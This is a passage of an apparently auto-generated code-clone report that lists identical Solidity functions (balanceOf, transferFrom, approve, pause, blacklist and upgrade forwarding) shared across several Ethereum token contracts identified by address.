        balances[_to] = balances[_to].add(sendAmount);
        if (fee > 0) {
            balances[owner] = balances[owner].add(fee);
            Transfer(msg.sender, owner, fee);
        }
        Transfer(msg.sender, _to, sendAmount);
    }
</source>
</class>

<class classid="95" nclones="11" nlines="3" similarity="100">
<source file="systems/source-code/0x1804878a592887400697efb94134474a6bc6830f.sol" startline="150" endline="152" pcid="745">
    function balanceOf(address _owner) public constant returns (uint balance) {
        return balances[_owner];
    }
</source>
<source file="systems/source-code/0x76d10a4438bdc79c3fe47dfa0b174ae5fd522db6.sol" startline="146" endline="148" pcid="4447">
    function balanceOf(address _owner) public constant returns (uint balance) {
        return balances[_owner];
    }
</source>
<source file="systems/source-code/0xcfcb73e6d920f1a1c22c9c7381499cdcabd0a69c.sol" startline="146" endline="148" pcid="7398">
    function balanceOf(address _owner) public constant returns (uint balance) {
        return balances[_owner];
    }
</source>
<source file="systems/source-code/0x8b49740b4c824252dc4b543c746eae0549c22a15.sol" startline="39" endline="41" pcid="5155">
    function balanceOf(address account) public view returns (uint balance) {
        return balances[account];
    }
</source>
<source file="systems/source-code/0xf4c78e50dbf4d7f864c659d1119c717926e9ff24.sol" startline="142" endline="144" pcid="8926">
    function balanceOf(address _owner) public constant returns (uint balance) {
        return balances[_owner];
    }
</source>
<source file="systems/source-code/0x1ac50ddad5d190bd8403d70b5127749ea6ece230.sol" startline="63" endline="65" pcid="847">
    function balanceOf(address tokenOwner) public view returns (uint balance) {
        return balances[tokenOwner];
    }
</source>
<source file="systems/source-code/0x4B045C40Ed6b99FB4551522B95C97b7F7aB31371.sol" startline="39" endline="41" pcid="2810">
    function balanceOf(address account) public view returns (uint balance) {
        return balances[account];
    }
</source>
<source file="systems/source-code/0x59951d9ca559862975e2f6c400f785029697ee05.sol" startline="146" endline="148" pcid="3359">
    function balanceOf(address _owner) public constant returns (uint balance) {
        return balances[_owner];
    }
</source>
<source file="systems/source-code/0x4537e1fb3777552b5e2475d45651702f3da39358.sol" startline="142" endline="144" pcid="2589">
    function balanceOf(address _owner) public constant returns (uint balance) {
        return balances[_owner];
    }
</source>
<source file="systems/source-code/0xc630c6bff4d198f30d9ab86f89fb83f0bc3fb948.sol" startline="137" endline="139" pcid="7135">
     function balanceOf(address tokenOwner) public view returns (uint balance) {
         return balances[tokenOwner];
     }
</source>
<source file="systems/source-code/0x809d09a379bc553436aa267efa682093d226923d.sol" startline="142" endline="144" pcid="4757">
    function balanceOf(address _owner) public constant returns (uint balance) {
        return balances[_owner];
    }
</source>
</class>

<class classid="96" nclones="7" nlines="18" similarity="100">
<source file="systems/source-code/0x1804878a592887400697efb94134474a6bc6830f.sol" startline="175" endline="196" pcid="746">
    function transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3 * 32) {
        var _allowance = allowed[_from][msg.sender];

        // Check is not needed because sub(_allowance, _value) will already throw if this condition is not met
        // if (_value > _allowance) throw;

        uint fee = (_value.mul(basisPointsRate)).div(10000);
        if (fee > maximumFee) {
            fee = maximumFee;
        }
        if (_allowance < MAX_UINT) {
            allowed[_from][msg.sender] = _allowance.sub(_value);
        }
        uint sendAmount = _value.sub(fee);
        balances[_from] = balances[_from].sub(_value);
        balances[_to] = balances[_to].add(sendAmount);
        if (fee > 0) {
            balances[owner] = balances[owner].add(fee);
            Transfer(_from, owner, fee);
        }
        Transfer(_from, _to, sendAmount);
    }
</source>
<source file="systems/source-code/0xf4c78e50dbf4d7f864c659d1119c717926e9ff24.sol" startline="167" endline="188" pcid="8927">
    function transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3 * 32) {
        var _allowance = allowed[_from][msg.sender];

        // Check is not needed because sub(_allowance, _value) will already throw if this condition is not met
        // if (_value > _allowance) throw;

        uint fee = (_value.mul(basisPointsRate)).div(10000);
        if (fee > maximumFee) {
            fee = maximumFee;
        }
        if (_allowance < MAX_UINT) {
            allowed[_from][msg.sender] = _allowance.sub(_value);
        }
        uint sendAmount = _value.sub(fee);
        balances[_from] = balances[_from].sub(_value);
        balances[_to] = balances[_to].add(sendAmount);
        if (fee > 0) {
            balances[owner] = balances[owner].add(fee);
            Transfer(_from, owner, fee);
        }
        Transfer(_from, _to, sendAmount);
    }
</source>
<source file="systems/source-code/0x809d09a379bc553436aa267efa682093d226923d.sol" startline="167" endline="188" pcid="4758">
    function transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3 * 32) {
        var _allowance = allowed[_from][msg.sender];

        // Check is not needed because sub(_allowance, _value) will already throw if this condition is not met
        // if (_value > _allowance) throw;

        uint fee = (_value.mul(basisPointsRate)).div(10000);
        if (fee > maximumFee) {
            fee = maximumFee;
        }
        if (_allowance < MAX_UINT) {
            allowed[_from][msg.sender] = _allowance.sub(_value);
        }
        uint sendAmount = _value.sub(fee);
        balances[_from] = balances[_from].sub(_value);
        balances[_to] = balances[_to].add(sendAmount);
        if (fee > 0) {
            balances[owner] = balances[owner].add(fee);
            Transfer(_from, owner, fee);
        }
        Transfer(_from, _to, sendAmount);
    }
</source>
<source file="systems/source-code/0x4537e1fb3777552b5e2475d45651702f3da39358.sol" startline="167" endline="188" pcid="2590">
    function transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3 * 32) {
        var _allowance = allowed[_from][msg.sender];

        // Check is not needed because sub(_allowance, _value) will already throw if this condition is not met
        // if (_value > _allowance) throw;

        uint fee = (_value.mul(basisPointsRate)).div(10000);
        if (fee > maximumFee) {
            fee = maximumFee;
        }
        if (_allowance < MAX_UINT) {
            allowed[_from][msg.sender] = _allowance.sub(_value);
        }
        uint sendAmount = _value.sub(fee);
        balances[_from] = balances[_from].sub(_value);
        balances[_to] = balances[_to].add(sendAmount);
        if (fee > 0) {
            balances[owner] = balances[owner].add(fee);
            Transfer(_from, owner, fee);
        }
        Transfer(_from, _to, sendAmount);
    }
</source>
<source file="systems/source-code/0x59951d9ca559862975e2f6c400f785029697ee05.sol" startline="171" endline="192" pcid="3360">
    function transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3 * 32) {
        var _allowance = allowed[_from][msg.sender];

        // Check is not needed because sub(_allowance, _value) will already throw if this condition is not met
        // if (_value > _allowance) throw;

        uint fee = (_value.mul(basisPointsRate)).div(10000);
        if (fee > maximumFee) {
            fee = maximumFee;
        }
        if (_allowance < MAX_UINT) {
            allowed[_from][msg.sender] = _allowance.sub(_value);
        }
        uint sendAmount = _value.sub(fee);
        balances[_from] = balances[_from].sub(_value);
        balances[_to] = balances[_to].add(sendAmount);
        if (fee > 0) {
            balances[owner] = balances[owner].add(fee);
            Transfer(_from, owner, fee);
        }
        Transfer(_from, _to, sendAmount);
    }
</source>
<source file="systems/source-code/0x76d10a4438bdc79c3fe47dfa0b174ae5fd522db6.sol" startline="171" endline="192" pcid="4448">
    function transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3 * 32) {
        var _allowance = allowed[_from][msg.sender];

        // Check is not needed because sub(_allowance, _value) will already throw if this condition is not met
        // if (_value > _allowance) throw;

        uint fee = (_value.mul(basisPointsRate)).div(10000);
        if (fee > maximumFee) {
            fee = maximumFee;
        }
        if (_allowance < MAX_UINT) {
            allowed[_from][msg.sender] = _allowance.sub(_value);
        }
        uint sendAmount = _value.sub(fee);
        balances[_from] = balances[_from].sub(_value);
        balances[_to] = balances[_to].add(sendAmount);
        if (fee > 0) {
            balances[owner] = balances[owner].add(fee);
            Transfer(_from, owner, fee);
        }
        Transfer(_from, _to, sendAmount);
    }
</source>
<source file="systems/source-code/0xcfcb73e6d920f1a1c22c9c7381499cdcabd0a69c.sol" startline="171" endline="192" pcid="7399">
    function transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3 * 32) {
        var _allowance = allowed[_from][msg.sender];

        // Check is not needed because sub(_allowance, _value) will already throw if this condition is not met
        // if (_value > _allowance) throw;

        uint fee = (_value.mul(basisPointsRate)).div(10000);
        if (fee > maximumFee) {
            fee = maximumFee;
        }
        if (_allowance < MAX_UINT) {
            allowed[_from][msg.sender] = _allowance.sub(_value);
        }
        uint sendAmount = _value.sub(fee);
        balances[_from] = balances[_from].sub(_value);
        balances[_to] = balances[_to].add(sendAmount);
        if (fee > 0) {
            balances[owner] = balances[owner].add(fee);
            Transfer(_from, owner, fee);
        }
        Transfer(_from, _to, sendAmount);
    }
</source>
</class>

<class classid="97" nclones="7" nlines="5" similarity="100">
<source file="systems/source-code/0x1804878a592887400697efb94134474a6bc6830f.sol" startline="203" endline="213" pcid="747">
    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {

        // To change the approve amount you first have to reduce the addresses`
        //  allowance to zero by calling `approve(_spender, 0)` if it is not
        //  already 0 to mitigate the race condition described here:
        //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
        require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));

        allowed[msg.sender][_spender] = _value;
        Approval(msg.sender, _spender, _value);
    }
</source>
<source file="systems/source-code/0xcfcb73e6d920f1a1c22c9c7381499cdcabd0a69c.sol" startline="199" endline="209" pcid="7400">
    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {

        // To change the approve amount you first have to reduce the addresses`
        //  allowance to zero by calling `approve(_spender, 0)` if it is not
        //  already 0 to mitigate the race condition described here:
        //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
        require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));

        allowed[msg.sender][_spender] = _value;
        Approval(msg.sender, _spender, _value);
    }
</source>
<source file="systems/source-code/0x809d09a379bc553436aa267efa682093d226923d.sol" startline="195" endline="205" pcid="4759">
    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {

        // To change the approve amount you first have to reduce the addresses`
        //  allowance to zero by calling `approve(_spender, 0)` if it is not
        //  already 0 to mitigate the race condition described here:
        //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
        require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));

        allowed[msg.sender][_spender] = _value;
        Approval(msg.sender, _spender, _value);
    }
</source>
<source file="systems/source-code/0x4537e1fb3777552b5e2475d45651702f3da39358.sol" startline="195" endline="205" pcid="2591">
    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {

        // To change the approve amount you first have to reduce the addresses`
        //  allowance to zero by calling `approve(_spender, 0)` if it is not
        //  already 0 to mitigate the race condition described here:
        //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
        require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));

        allowed[msg.sender][_spender] = _value;
        Approval(msg.sender, _spender, _value);
    }
</source>
<source file="systems/source-code/0x59951d9ca559862975e2f6c400f785029697ee05.sol" startline="199" endline="209" pcid="3361">
    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {

        // To change the approve amount you first have to reduce the addresses`
        //  allowance to zero by calling `approve(_spender, 0)` if it is not
        //  already 0 to mitigate the race condition described here:
        //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
        require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));

        allowed[msg.sender][_spender] = _value;
        Approval(msg.sender, _spender, _value);
    }
</source>
<source file="systems/source-code/0xf4c78e50dbf4d7f864c659d1119c717926e9ff24.sol" startline="195" endline="205" pcid="8928">
    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {

        // To change the approve amount you first have to reduce the addresses`
        //  allowance to zero by calling `approve(_spender, 0)` if it is not
        //  already 0 to mitigate the race condition described here:
        //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
        require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));

        allowed[msg.sender][_spender] = _value;
        Approval(msg.sender, _spender, _value);
    }
</source>
<source file="systems/source-code/0x76d10a4438bdc79c3fe47dfa0b174ae5fd522db6.sol" startline="199" endline="209" pcid="4449">
    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {

        // To change the approve amount you first have to reduce the addresses`
        //  allowance to zero by calling `approve(_spender, 0)` if it is not
        //  already 0 to mitigate the race condition described here:
        //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
        require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));

        allowed[msg.sender][_spender] = _value;
        Approval(msg.sender, _spender, _value);
    }
</source>
</class>

<class classid="98" nclones="11" nlines="3" similarity="100">
<source file="systems/source-code/0x1804878a592887400697efb94134474a6bc6830f.sol" startline="221" endline="223" pcid="748">
    function allowance(address _owner, address _spender) public constant returns (uint remaining) {
        return allowed[_owner][_spender];
    }
</source>
<source file="systems/source-code/0x8b49740b4c824252dc4b543c746eae0549c22a15.sol" startline="63" endline="65" pcid="5159">
        function allowance(address owner, address spender) public view returns (uint remaining) {
            return allowed[owner][spender];
        }
</source>
<source file="systems/source-code/0xcfcb73e6d920f1a1c22c9c7381499cdcabd0a69c.sol" startline="217" endline="219" pcid="7401">
    function allowance(address _owner, address _spender) public constant returns (uint remaining) {
        return allowed[_owner][_spender];
    }
</source>
<source file="systems/source-code/0x4B045C40Ed6b99FB4551522B95C97b7F7aB31371.sol" startline="63" endline="65" pcid="2814">
        function allowance(address owner, address spender) public view returns (uint remaining) {
            return allowed[owner][spender];
        }
</source>
<source file="systems/source-code/0x809d09a379bc553436aa267efa682093d226923d.sol" startline="213" endline="215" pcid="4760">
    function allowance(address _owner, address _spender) public constant returns (uint remaining) {
        return allowed[_owner][_spender];
    }
</source>
<source file="systems/source-code/0x1ac50ddad5d190bd8403d70b5127749ea6ece230.sol" startline="67" endline="69" pcid="848">
    function allowance(address tokenOwner, address spender) public view returns (uint remaining) {
        return allowed[tokenOwner][spender];
    }
</source>
<source file="systems/source-code/0x4537e1fb3777552b5e2475d45651702f3da39358.sol" startline="213" endline="215" pcid="2592">
    function allowance(address _owner, address _spender) public constant returns (uint remaining) {
        return allowed[_owner][_spender];
    }
</source>
<source file="systems/source-code/0x76d10a4438bdc79c3fe47dfa0b174ae5fd522db6.sol" startline="217" endline="219" pcid="4450">
    function allowance(address _owner, address _spender) public constant returns (uint remaining) {
        return allowed[_owner][_spender];
    }
</source>
<source file="systems/source-code/0xc630c6bff4d198f30d9ab86f89fb83f0bc3fb948.sol" startline="192" endline="194" pcid="7139">
     function allowance(address tokenOwner, address spender) public view returns (uint remaining) {
         return allowed[tokenOwner][spender];
     }
</source>
<source file="systems/source-code/0x59951d9ca559862975e2f6c400f785029697ee05.sol" startline="217" endline="219" pcid="3362">
    function allowance(address _owner, address _spender) public constant returns (uint remaining) {
        return allowed[_owner][_spender];
    }
</source>
<source file="systems/source-code/0xf4c78e50dbf4d7f864c659d1119c717926e9ff24.sol" startline="213" endline="215" pcid="8929">
    function allowance(address _owner, address _spender) public constant returns (uint remaining) {
        return allowed[_owner][_spender];
    }
</source>
</class>

<class classid="99" nclones="7" nlines="4" similarity="100">
<source file="systems/source-code/0x1804878a592887400697efb94134474a6bc6830f.sol" startline="258" endline="261" pcid="749">
  function pause() onlyOwner whenNotPaused public {
    paused = true;
    Pause();
  }
</source>
<source file="systems/source-code/0x809d09a379bc553436aa267efa682093d226923d.sol" startline="250" endline="253" pcid="4761">
    function pause() onlyOwner whenNotPaused public {
        paused = true;
        Pause();
    }
</source>
<source file="systems/source-code/0x4537e1fb3777552b5e2475d45651702f3da39358.sol" startline="250" endline="253" pcid="2593">
    function pause() onlyOwner whenNotPaused public {
        paused = true;
        Pause();
    }
</source>
<source file="systems/source-code/0x76d10a4438bdc79c3fe47dfa0b174ae5fd522db6.sol" startline="254" endline="257" pcid="4451">
  function pause() onlyOwner whenNotPaused public {
    paused = true;
    Pause();
  }
</source>
<source file="systems/source-code/0xcfcb73e6d920f1a1c22c9c7381499cdcabd0a69c.sol" startline="254" endline="257" pcid="7402">
  function pause() onlyOwner whenNotPaused public {
    paused = true;
    Pause();
  }
</source>
<source file="systems/source-code/0xf4c78e50dbf4d7f864c659d1119c717926e9ff24.sol" startline="250" endline="253" pcid="8930">
    function pause() onlyOwner whenNotPaused public {
        paused = true;
        Pause();
    }
</source>
<source file="systems/source-code/0x59951d9ca559862975e2f6c400f785029697ee05.sol" startline="254" endline="257" pcid="3363">
  function pause() onlyOwner whenNotPaused public {
    paused = true;
    Pause();
  }
</source>
</class>

<class classid="100" nclones="7" nlines="4" similarity="100">
<source file="systems/source-code/0x1804878a592887400697efb94134474a6bc6830f.sol" startline="266" endline="269" pcid="750">
  function unpause() onlyOwner whenPaused public {
    paused = false;
    Unpause();
  }
</source>
<source file="systems/source-code/0x4537e1fb3777552b5e2475d45651702f3da39358.sol" startline="258" endline="261" pcid="2594">
    function unpause() onlyOwner whenPaused public {
        paused = false;
        Unpause();
    }
</source>
<source file="systems/source-code/0xcfcb73e6d920f1a1c22c9c7381499cdcabd0a69c.sol" startline="262" endline="265" pcid="7403">
  function unpause() onlyOwner whenPaused public {
    paused = false;
    Unpause();
  }
</source>
<source file="systems/source-code/0x76d10a4438bdc79c3fe47dfa0b174ae5fd522db6.sol" startline="262" endline="265" pcid="4452">
  function unpause() onlyOwner whenPaused public {
    paused = false;
    Unpause();
  }
</source>
<source file="systems/source-code/0x809d09a379bc553436aa267efa682093d226923d.sol" startline="258" endline="261" pcid="4762">
    function unpause() onlyOwner whenPaused public {
        paused = false;
        Unpause();
    }
</source>
<source file="systems/source-code/0xf4c78e50dbf4d7f864c659d1119c717926e9ff24.sol" startline="258" endline="261" pcid="8931">
    function unpause() onlyOwner whenPaused public {
        paused = false;
        Unpause();
    }
</source>
<source file="systems/source-code/0x59951d9ca559862975e2f6c400f785029697ee05.sol" startline="262" endline="265" pcid="3364">
  function unpause() onlyOwner whenPaused public {
    paused = false;
    Unpause();
  }
</source>
</class>

<class classid="101" nclones="7" nlines="4" similarity="100">
<source file="systems/source-code/0x1804878a592887400697efb94134474a6bc6830f.sol" startline="285" endline="288" pcid="753">
    function addBlackList (address _evilUser) public onlyOwner {
        isBlackListed[_evilUser] = true;
        AddedBlackList(_evilUser);
    }
</source>
<source file="systems/source-code/0x809d09a379bc553436aa267efa682093d226923d.sol" startline="277" endline="280" pcid="4765">
    function addBlackList (address _evilUser) public onlyOwner {
        isBlackListed[_evilUser] = true;
        AddedBlackList(_evilUser);
    }
</source>
<source file="systems/source-code/0x4537e1fb3777552b5e2475d45651702f3da39358.sol" startline="277" endline="280" pcid="2597">
    function addBlackList (address _evilUser) public onlyOwner {
        isBlackListed[_evilUser] = true;
        AddedBlackList(_evilUser);
    }
</source>
<source file="systems/source-code/0x76d10a4438bdc79c3fe47dfa0b174ae5fd522db6.sol" startline="281" endline="284" pcid="4455">
    function addBlackList (address _evilUser) public onlyOwner {
        isBlackListed[_evilUser] = true;
        AddedBlackList(_evilUser);
    }
</source>
<source file="systems/source-code/0xcfcb73e6d920f1a1c22c9c7381499cdcabd0a69c.sol" startline="281" endline="284" pcid="7406">
    function addBlackList (address _evilUser) public onlyOwner {
        isBlackListed[_evilUser] = true;
        AddedBlackList(_evilUser);
    }
</source>
<source file="systems/source-code/0xf4c78e50dbf4d7f864c659d1119c717926e9ff24.sol" startline="277" endline="280" pcid="8934">
    function addBlackList (address _evilUser) public onlyOwner {
        isBlackListed[_evilUser] = true;
        AddedBlackList(_evilUser);
    }
</source>
<source file="systems/source-code/0x59951d9ca559862975e2f6c400f785029697ee05.sol" startline="281" endline="284" pcid="3367">
    function addBlackList (address _evilUser) public onlyOwner {
        isBlackListed[_evilUser] = true;
        AddedBlackList(_evilUser);
    }
</source>
</class>

<class classid="102" nclones="7" nlines="4" similarity="100">
<source file="systems/source-code/0x1804878a592887400697efb94134474a6bc6830f.sol" startline="290" endline="293" pcid="754">
    function removeBlackList (address _clearedUser) public onlyOwner {
        isBlackListed[_clearedUser] = false;
        RemovedBlackList(_clearedUser);
    }
</source>
<source file="systems/source-code/0x809d09a379bc553436aa267efa682093d226923d.sol" startline="282" endline="285" pcid="4766">
    function removeBlackList (address _clearedUser) public onlyOwner {
        isBlackListed[_clearedUser] = false;
        RemovedBlackList(_clearedUser);
    }
</source>
<source file="systems/source-code/0x76d10a4438bdc79c3fe47dfa0b174ae5fd522db6.sol" startline="286" endline="289" pcid="4456">
    function removeBlackList (address _clearedUser) public onlyOwner {
        isBlackListed[_clearedUser] = false;
        RemovedBlackList(_clearedUser);
    }
</source>
<source file="systems/source-code/0xcfcb73e6d920f1a1c22c9c7381499cdcabd0a69c.sol" startline="286" endline="289" pcid="7407">
    function removeBlackList (address _clearedUser) public onlyOwner {
        isBlackListed[_clearedUser] = false;
        RemovedBlackList(_clearedUser);
    }
</source>
<source file="systems/source-code/0xf4c78e50dbf4d7f864c659d1119c717926e9ff24.sol" startline="282" endline="285" pcid="8935">
    function removeBlackList (address _clearedUser) public onlyOwner {
        isBlackListed[_clearedUser] = false;
        RemovedBlackList(_clearedUser);
    }
</source>
<source file="systems/source-code/0x59951d9ca559862975e2f6c400f785029697ee05.sol" startline="286" endline="289" pcid="3368">
    function removeBlackList (address _clearedUser) public onlyOwner {
        isBlackListed[_clearedUser] = false;
        RemovedBlackList(_clearedUser);
    }
</source>
<source file="systems/source-code/0x4537e1fb3777552b5e2475d45651702f3da39358.sol" startline="282" endline="285" pcid="2598">
    function removeBlackList (address _clearedUser) public onlyOwner {
        isBlackListed[_clearedUser] = false;
        RemovedBlackList(_clearedUser);
    }
</source>
</class>

<class classid="103" nclones="7" nlines="7" similarity="100">
<source file="systems/source-code/0x1804878a592887400697efb94134474a6bc6830f.sol" startline="295" endline="301" pcid="755">
    function destroyBlackFunds (address _blackListedUser) public onlyOwner {
        require(isBlackListed[_blackListedUser]);
        uint dirtyFunds = balanceOf(_blackListedUser);
        balances[_blackListedUser] = 0;
        _totalSupply -= dirtyFunds;
        DestroyedBlackFunds(_blackListedUser, dirtyFunds);
    }
</source>
<source file="systems/source-code/0xf4c78e50dbf4d7f864c659d1119c717926e9ff24.sol" startline="287" endline="293" pcid="8936">
    function destroyBlackFunds (address _blackListedUser) public onlyOwner {
        require(isBlackListed[_blackListedUser]);
        uint dirtyFunds = balanceOf(_blackListedUser);
        balances[_blackListedUser] = 0;
        _totalSupply -= dirtyFunds;
        DestroyedBlackFunds(_blackListedUser, dirtyFunds);
    }
</source>
<source file="systems/source-code/0xcfcb73e6d920f1a1c22c9c7381499cdcabd0a69c.sol" startline="291" endline="297" pcid="7408">
    function destroyBlackFunds (address _blackListedUser) public onlyOwner {
        require(isBlackListed[_blackListedUser]);
        uint dirtyFunds = balanceOf(_blackListedUser);
        balances[_blackListedUser] = 0;
        _totalSupply -= dirtyFunds;
        DestroyedBlackFunds(_blackListedUser, dirtyFunds);
    }
</source>
<source file="systems/source-code/0x4537e1fb3777552b5e2475d45651702f3da39358.sol" startline="287" endline="293" pcid="2599">
    function destroyBlackFunds (address _blackListedUser) public onlyOwner {
        require(isBlackListed[_blackListedUser]);
        uint dirtyFunds = balanceOf(_blackListedUser);
        balances[_blackListedUser] = 0;
        _totalSupply -= dirtyFunds;
        DestroyedBlackFunds(_blackListedUser, dirtyFunds);
    }
</source>
<source file="systems/source-code/0x59951d9ca559862975e2f6c400f785029697ee05.sol" startline="291" endline="297" pcid="3369">
    function destroyBlackFunds (address _blackListedUser) public onlyOwner {
        require(isBlackListed[_blackListedUser]);
        uint dirtyFunds = balanceOf(_blackListedUser);
        balances[_blackListedUser] = 0;
        _totalSupply -= dirtyFunds;
        DestroyedBlackFunds(_blackListedUser, dirtyFunds);
    }
</source>
<source file="systems/source-code/0x76d10a4438bdc79c3fe47dfa0b174ae5fd522db6.sol" startline="291" endline="297" pcid="4457">
    function destroyBlackFunds (address _blackListedUser) public onlyOwner {
        require(isBlackListed[_blackListedUser]);
        uint dirtyFunds = balanceOf(_blackListedUser);
        balances[_blackListedUser] = 0;
        _totalSupply -= dirtyFunds;
        DestroyedBlackFunds(_blackListedUser, dirtyFunds);
    }
</source>
<source file="systems/source-code/0x809d09a379bc553436aa267efa682093d226923d.sol" startline="287" endline="293" pcid="4767">
    function destroyBlackFunds (address _blackListedUser) public onlyOwner {
        require(isBlackListed[_blackListedUser]);
        uint dirtyFunds = balanceOf(_blackListedUser);
        balances[_blackListedUser] = 0;
        _totalSupply -= dirtyFunds;
        DestroyedBlackFunds(_blackListedUser, dirtyFunds);
    }
</source>
</class>

<class classid="104" nclones="4" nlines="9" similarity="100">
<source file="systems/source-code/0x1804878a592887400697efb94134474a6bc6830f.sol" startline="348" endline="355" pcid="756">
    function transfer(address _to, uint _value) public whenNotPaused {
        require(!isBlackListed[msg.sender]);
        if (deprecated) {
            return UpgradedStandardToken(upgradedAddress).transferByLegacy(msg.sender, _to, _value);
        } else {
            return super.transfer(_to, _value);
        }
    }
</source>
<source file="systems/source-code/0xcfcb73e6d920f1a1c22c9c7381499cdcabd0a69c.sol" startline="340" endline="347" pcid="7410">
    function transfer(address _to, uint _value) public whenNotPaused {
        require(!isBlackListed[msg.sender]);
        if (deprecated) {
            return UpgradedStandardToken(upgradedAddress).transferByLegacy(msg.sender, _to, _value);
        } else {
            return super.transfer(_to, _value);
        }
    }
</source>
<source file="systems/source-code/0x59951d9ca559862975e2f6c400f785029697ee05.sol" startline="340" endline="347" pcid="3371">
    function transfer(address _to, uint _value) public whenNotPaused {
        require(!isBlackListed[msg.sender]);
        if (deprecated) {
            return UpgradedStandardToken(upgradedAddress).transferByLegacy(msg.sender, _to, _value);
        } else {
            return super.transfer(_to, _value);
        }
    }
</source>
<source file="systems/source-code/0x76d10a4438bdc79c3fe47dfa0b174ae5fd522db6.sol" startline="340" endline="347" pcid="4459">
    function transfer(address _to, uint _value) public whenNotPaused {
        require(!isBlackListed[msg.sender]);
        if (deprecated) {
            return UpgradedStandardToken(upgradedAddress).transferByLegacy(msg.sender, _to, _value);
        } else {
            return super.transfer(_to, _value);
        }
    }
</source>
</class>

<class classid="105" nclones="4" nlines="9" similarity="100">
<source file="systems/source-code/0x1804878a592887400697efb94134474a6bc6830f.sol" startline="358" endline="365" pcid="757">
    function transferFrom(address _from, address _to, uint _value) public whenNotPaused {
        require(!isBlackListed[_from]);
        if (deprecated) {
            return UpgradedStandardToken(upgradedAddress).transferFromByLegacy(msg.sender, _from, _to, _value);
        } else {
            return super.transferFrom(_from, _to, _value);
        }
    }
</source>
<source file="systems/source-code/0xcfcb73e6d920f1a1c22c9c7381499cdcabd0a69c.sol" startline="350" endline="357" pcid="7411">
    function transferFrom(address _from, address _to, uint _value) public whenNotPaused {
        require(!isBlackListed[_from]);
        if (deprecated) {
            return UpgradedStandardToken(upgradedAddress).transferFromByLegacy(msg.sender, _from, _to, _value);
        } else {
            return super.transferFrom(_from, _to, _value);
        }
    }
</source>
<source file="systems/source-code/0x59951d9ca559862975e2f6c400f785029697ee05.sol" startline="350" endline="357" pcid="3372">
    function transferFrom(address _from, address _to, uint _value) public whenNotPaused {
        require(!isBlackListed[_from]);
        if (deprecated) {
            return UpgradedStandardToken(upgradedAddress).transferFromByLegacy(msg.sender, _from, _to, _value);
        } else {
            return super.transferFrom(_from, _to, _value);
        }
    }
</source>
<source file="systems/source-code/0x76d10a4438bdc79c3fe47dfa0b174ae5fd522db6.sol" startline="350" endline="357" pcid="4460">
    function transferFrom(address _from, address _to, uint _value) public whenNotPaused {
        require(!isBlackListed[_from]);
        if (deprecated) {
            return UpgradedStandardToken(upgradedAddress).transferFromByLegacy(msg.sender, _from, _to, _value);
        } else {
            return super.transferFrom(_from, _to, _value);
        }
    }
</source>
</class>

<class classid="106" nclones="7" nlines="8" similarity="100">
<source file="systems/source-code/0x1804878a592887400697efb94134474a6bc6830f.sol" startline="368" endline="374" pcid="758">
    function balanceOf(address who) public constant returns (uint) {
        if (deprecated) {
            return UpgradedStandardToken(upgradedAddress).balanceOf(who);
        } else {
            return super.balanceOf(who);
        }
    }
</source>
<source file="systems/source-code/0xcfcb73e6d920f1a1c22c9c7381499cdcabd0a69c.sol" startline="360" endline="366" pcid="7412">
    function balanceOf(address who) public constant returns (uint) {
        if (deprecated) {
            return UpgradedStandardToken(upgradedAddress).balanceOf(who);
        } else {
            return super.balanceOf(who);
        }
    }
</source>
<source file="systems/source-code/0x809d09a379bc553436aa267efa682093d226923d.sol" startline="460" endline="466" pcid="4774">
    function balanceOf(address who) public constant returns (uint) {
        if (deprecated) {
            return UpgradedStandardToken(upgradedAddress).balanceOf(who);
        } else {
            return super.balanceOf(who);
        }
    }
</source>
<source file="systems/source-code/0x76d10a4438bdc79c3fe47dfa0b174ae5fd522db6.sol" startline="360" endline="366" pcid="4461">
    function balanceOf(address who) public constant returns (uint) {
        if (deprecated) {
            return UpgradedStandardToken(upgradedAddress).balanceOf(who);
        } else {
            return super.balanceOf(who);
        }
    }
</source>
<source file="systems/source-code/0xf4c78e50dbf4d7f864c659d1119c717926e9ff24.sol" startline="460" endline="466" pcid="8943">
    function balanceOf(address who) public constant returns (uint) {
        if (deprecated) {
            return UpgradedStandardToken(upgradedAddress).balanceOf(who);
        } else {
            return super.balanceOf(who);
        }
    }
</source>
<source file="systems/source-code/0x59951d9ca559862975e2f6c400f785029697ee05.sol" startline="360" endline="366" pcid="3373">
    function balanceOf(address who) public constant returns (uint) {
        if (deprecated) {
            return UpgradedStandardToken(upgradedAddress).balanceOf(who);
        } else {
            return super.balanceOf(who);
        }
    }
</source>
<source file="systems/source-code/0x4537e1fb3777552b5e2475d45651702f3da39358.sol" startline="460" endline="466" pcid="2606">
    function balanceOf(address who) public constant returns (uint) {
        if (deprecated) {
            return UpgradedStandardToken(upgradedAddress).balanceOf(who);
        } else {
            return super.balanceOf(who);
        }
    }
</source>
</class>

<class classid="107" nclones="7" nlines="8" similarity="100">
<source file="systems/source-code/0x1804878a592887400697efb94134474a6bc6830f.sol" startline="377" endline="383" pcid="759">
    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {
        if (deprecated) {
